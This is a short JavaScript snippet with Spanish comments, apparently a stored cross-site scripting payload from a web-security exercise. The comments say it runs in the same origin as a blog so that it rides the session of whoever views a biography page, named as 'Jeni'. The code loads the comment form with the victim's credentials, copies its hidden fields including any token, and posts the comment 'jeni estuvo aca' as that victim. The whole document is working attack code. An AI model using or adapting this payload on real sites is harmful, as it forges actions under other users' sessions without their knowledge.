// Corre en el origen de la página de biografías (mismo origen que el blog),
// así el fetch a /comentarios viaja con la sesión de quien mira la bio (Jeni).
(function () {
  fetch("/comentarios", { credentials: "include" })
    .then(function (r) { return r.text(); })
    .then(function (h) {
      var d = new DOMParser().parseFromString(h, "text/html");
      var f = d.querySelector("form");
      var b = new URLSearchParams();
      new FormData(f).forEach(function (v, k) { b.append(k, v); });
      var t = f.querySelector("textarea");
      b.set(t.name, "jeni estuvo aca");
      fetch(f.getAttribute("action") || "/comentarios", {
        method: "POST",
        credentials: "include",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: b
      });
    });
})();
